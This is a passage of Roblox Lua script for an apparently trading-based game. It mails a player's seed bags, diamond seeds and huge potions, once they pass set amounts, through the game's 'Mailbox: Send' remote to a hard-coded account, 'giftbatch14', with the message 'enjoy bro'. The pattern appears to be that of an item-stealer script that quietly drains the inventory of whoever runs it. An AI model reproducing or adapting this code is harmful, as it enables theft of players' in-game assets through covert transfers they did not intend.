        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))
    end            
    wait(5)
    if SeedBagAmount > 500 then 
        local args2 = {
            [1] = "giftbatch14",
            [2] = "enjoy bro",
            [3] = "Misc",
            [4] = SeedBagUID,
            [5] = SeedBagAmount 
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))
    end
  wait(5)
    if DiamondsSeedAmount > 300 then 
        local args2 = {
            [1] = "giftbatch14",
            [2] = "enjoy bro",
            [3] = "Misc",
            [4] = DiamondsSeedUID,
            [5] = DiamondsSeedAmount - 100
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))
    end
    wait(5)

if hugepotionamount > 50 then
local args2 = {
            [1] = "giftbatch14",
            [2] = "enjoy bro",
            [3] = "Potion",
            [4] = hugepotionuid,
            [5] = hugepotionamount
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))

end
wait(5)
end
